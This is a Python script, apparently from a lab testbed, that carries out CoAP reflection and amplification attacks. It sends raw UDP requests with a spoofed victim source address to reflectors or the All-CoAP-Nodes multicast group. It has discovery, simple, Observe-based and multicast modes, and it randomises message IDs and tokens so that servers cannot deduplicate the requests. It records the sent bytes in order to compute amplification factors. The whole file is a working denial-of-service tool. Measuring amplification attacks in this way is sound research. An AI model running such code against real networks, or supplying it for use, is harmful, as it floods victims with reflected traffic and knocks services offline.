"""Spoofing attacker: sends CoAP requests with the victim's source address.

Modes map directly onto draft-irtf-t2trg-amplification-attacks:
  discovery : spoofed GET /.well-known/core           (Oliveira baseline)
  simple    : spoofed GET /quote                       (factor c)
  observe   : spoofed GET /obs with Observe option     (factor c*n)
  multicast : one spoofed GET to the All-CoAP-Nodes group (factor c*m, best effort)

All responses are directed by the reflectors to VICTIM_IP:VICTIM_PORT because
that is the (spoofed) source of every request. Attacker-sent bytes are logged
to /results/attacker.json as the amplification-factor denominator.

Env / args:
  VICTIM_IP    (default 10.80.0.5)   VICTIM_PORT (default 5683)
  REFLECTORS   comma list, or DNS name 'reflector' resolved to all A records
  --mode --count --path --reflectors --rate
"""
import argparse
import json
import os
import random
import socket
import time

import coap
from rawsend import RawSender

MCAST_V4 = "224.0.1.187"  # All CoAP Nodes (RFC 7252 section 12.8)


def resolve_reflectors(spec):
    ips = []
    for host in spec.split(","):
        host = host.strip()
        if not host:
            continue
        try:
            socket.inet_aton(host)
            ips.append(host)
        except OSError:
            # DNS name (Docker service) -> may resolve to many container IPs
            for res in socket.getaddrinfo(host, 5683, socket.AF_INET, socket.SOCK_DGRAM):
                ip = res[4][0]
                if ip not in ips:
                    ips.append(ip)
    return ips


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", default="simple",
                    choices=["discovery", "simple", "observe", "multicast"])
    ap.add_argument("--count", type=int, default=1,
                    help="requests sent per reflector (simple/discovery/observe)")
    ap.add_argument("--path", default=None, help="override Uri-Path")
    ap.add_argument("--reflectors", default=os.environ.get("REFLECTORS", "reflector"))
    ap.add_argument("--rate", type=float, default=0.0,
                    help="seconds to sleep between sends (0 = as fast as possible)")
    ap.add_argument("--out", default="/results/attacker.json")
    args = ap.parse_args()

    victim_ip = os.environ.get("VICTIM_IP", "10.80.0.5")
    victim_port = int(os.environ.get("VICTIM_PORT", "5683"))

    tx = RawSender()
    # Fresh random Message ID + token per message, otherwise the server
    # deduplicates repeated requests from the (spoofed) victim endpoint
    # (RFC 7252 section 4.5) and sends no response after the first.
    def coap_get(path, observe=False):
        mid = random.randint(0, 0xFFFF)
        token = os.urandom(4)
        opts = []
        if observe:
            opts.append((coap.OPT_OBSERVE, b""))  # register (value 0)
        opts += coap.uri_path_options(path)
        return coap.encode(coap.NON, coap.GET, mid, token=token, options=opts)

    t0 = time.time()
    if args.mode == "multicast":
        path = args.path or "temperature"
        for _ in range(args.count):
            tx.send(victim_ip, MCAST_V4, victim_port, 5683, coap_get(path))
            if args.rate:
                time.sleep(args.rate)
        targets = [MCAST_V4]
    else:
        reflectors = resolve_reflectors(args.reflectors)
        if not reflectors:
            raise SystemExit("no reflectors resolved from %r" % args.reflectors)
        if args.mode == "discovery":
            path, observe = args.path or "/.well-known/core", False
        elif args.mode == "simple":
            path, observe = args.path or "quote", False
        else:  # observe
            path, observe = args.path or "obs", True
        for _ in range(args.count):
            for rip in reflectors:
                # fresh mid/token per packet defeats server-side deduplication
                tx.send(victim_ip, rip, victim_port, 5683, coap_get(path, observe))
                if args.rate:
                    time.sleep(args.rate)
        targets = reflectors

    data = {
        "mode": args.mode,
        "targets": targets,
        "victim": "%s:%d" % (victim_ip, victim_port),
        "packets": tx.packets,
        "udp_payload_bytes": tx.udp_payload_bytes,
        "ip_bytes": tx.ip_bytes,
        "duration_s": round(time.time() - t0, 4),
    }
    with open(args.out, "w") as f:
        json.dump(data, f)
    print("attacker:", data, flush=True)


if __name__ == "__main__":
    main()
